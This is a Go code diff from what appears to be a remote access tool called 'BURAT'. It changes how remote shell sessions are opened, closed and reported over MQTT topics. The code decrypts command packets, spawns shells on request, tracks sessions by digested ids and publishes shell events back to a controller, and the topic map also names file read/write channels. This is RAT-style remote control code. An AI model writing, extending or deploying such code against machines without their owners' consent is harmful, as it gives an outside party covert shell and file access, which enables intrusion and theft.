@@ -8,6 +8,7 @@ import (
 
 	"fmt"
 	"time"
+	"strings"
 )
 
 func main() {
@@ -27,9 +28,9 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		"nil":										"bu/nil",
 		"bushi":									"bu/bushi/BURAT",
 		"remoteshell":						"bu/bushi/BURAT/bushido/remoteshell/+",
-		"remoteshell_cmd_open":		"bu/bushi/BURAT/bushido/remoteshell/+/cmd/open",
-		"remoteshell_cmd_close":	"bu/bushi/BURAT/bushido/remoteshell/+/cmd/close",
 		"remoteshell_cmd_write":	"bu/bushi/BURAT/bushido/remoteshell/+/cmd/write",
+		"remoteshell_evt_open":		"bu/bushi/BURAT/bushido/remoteshell/+/evt/open",
+		"remoteshell_evt_close":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/close",
 		"remoteshell_evt_read":		"bu/bushi/BURAT/bushido/remoteshell/+/evt/read",
 		"remoteshell_evt_write":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/write",
 		"remoteshell_evt_error":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/error",
@@ -43,16 +44,20 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		"filerw_evt_error":				"bu/bushi/BURAT/bushido/filerw/+/evt/error",
 	})
 
-	burat.AddTopicCallback("remoteshell_cmd_open", func (client mqtt.Client, message mqtt.Message) {
-		var packet packets.RemoteShellOpenPacket
-		burat.Decryse(message.Payload(), &packet)
-		burat.Bushido().RemoteShell.Open(packet.Id, packet.Shell)
-	})
-
-	burat.AddTopicCallback("remoteshell_cmd_close", func (client mqtt.Client, message mqtt.Message) {
-		var packet packets.RemoteShellClosePacket
-		burat.Decryse(message.Payload(), &packet)
-		burat.Bushido().RemoteShell.Close(packet.Id)
+	burat.AddTopicCallback("remoteshell", func (client mqtt.Client, message mqtt.Message) {
+		if len(message.Payload()) != 0  {
+			var packet packets.RemoteShellPacket
+			burat.Decryse(message.Payload(), &packet)
+			burat.Bushido().RemoteShell.Open(packet.Id, packet.Shell)
+		} else {
+			id := (strings.Split(message.Topic(), "/"))[5]
+			remoteshells := burat.Bushido().RemoteShell.RemoteShells()
+			for _, rs := range remoteshells {
+				if burat.Internals().Digest.Digest(rs.Id()) == id {
+					burat.Bushido().RemoteShell.Close(rs.Id())
+				}
+			}
+		}
 	})
 
 	burat.AddTopicCallback("remoteshell_cmd_write", func (client mqtt.Client, message mqtt.Message) {
@@ -87,18 +92,14 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 
 	burat.Bushido().RemoteShell.OnOpen(func (id string) {
 		fmt.Println("remoteshell.open", id)
-		remoteshells := burat.Bushido().RemoteShell.RemoteShells()
-		for _, rs := range remoteshells {
-			if rs.Id() == id {
-				packet := burat.Seen(packets.RemoteShellOnOpenPacket { Id: id, Shell: rs.Shell() })
-				burat.Publish(id, "remoteshell", 2, true, packet)
-			}
-		}
+		packet := burat.Seen(packets.RemoteShellOnOpenPacket { Id: id })
+		burat.Publish(id, "remoteshell_evt_open", 2, false, packet)
 	})
 
 	burat.Bushido().RemoteShell.OnClose(func (id string) {
 		fmt.Println("remoteshell.close", id)
-		burat.Publish(id, "remoteshell", 2, true, nil)
+		packet := burat.Seen(packets.RemoteShellOnClosePacket { Id: id })
+		burat.Publish(id, "remoteshell_evt_close", 2, false, packet)
 	})
 
 	burat.Bushido().RemoteShell.OnRead(func (id string, data string) {
